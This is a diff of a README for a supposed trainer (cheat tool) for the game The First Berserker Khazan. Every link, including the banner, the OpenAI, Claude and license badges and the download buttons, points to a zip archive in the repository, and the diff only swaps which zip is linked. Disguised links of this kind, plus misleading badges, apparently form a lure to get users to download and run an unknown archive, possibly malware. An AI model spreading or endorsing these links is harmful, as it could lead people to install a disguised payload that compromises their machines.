@@ -1,12 +1,12 @@
 # The First Berserker Khazan Trainer
 
-![Berserker Banner](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip%20First%20Berserker%20Khazan-Official%https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
-![OpenAI API](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip) 
-![Claude API](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
-![Languages](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
-![MIT License](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
+![Berserker Banner](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip%20First%20Berserker%20Khazan-Official%https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip)
+![OpenAI API](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip) 
+![Claude API](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip)
+![Languages](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip)
+![MIT License](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip)
 
-[![Download](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
+[![Download](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip)](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Enjoy seamless performance across a host of battlefields. Whether you wield Wind
 ## 🚀 Installation Guide
 
 1. **Leap into your quest—Download The First Berserker Khazan Trainer:**
-    - [Download Now!](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip) (https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
+    - [Download Now!](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip) (https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip)
 2. **Unpack your toolkit:**
     - Extract the contents of the archive to a secure folder on your device.
 3. **Activation (The Ritual):**
@@ -128,13 +128,13 @@ While this toolkit crafts immense advantage, it does so under our unique philoso
 
 ## 📜 MIT License (2025)
 
-Licensed under the [MIT License (2025)](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip).
+Licensed under the [MIT License (2025)](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip).
 
 _Your epic journey is yours to build, adapt, and share. Honor the code, pass the torch, and always leave the world of adventure better than you found it._
 
 ---
 
-[![Download](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/prologue-trainer-khazan-berserker-3.4.zip)
+[![Download](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip)](https://raw.githubusercontent.com/Luizgugss/berserker-khazan-trainer-prologue/branch/writee/berserker_prologue_trainer_khazan_v1.2.zip)
 
 ---
 
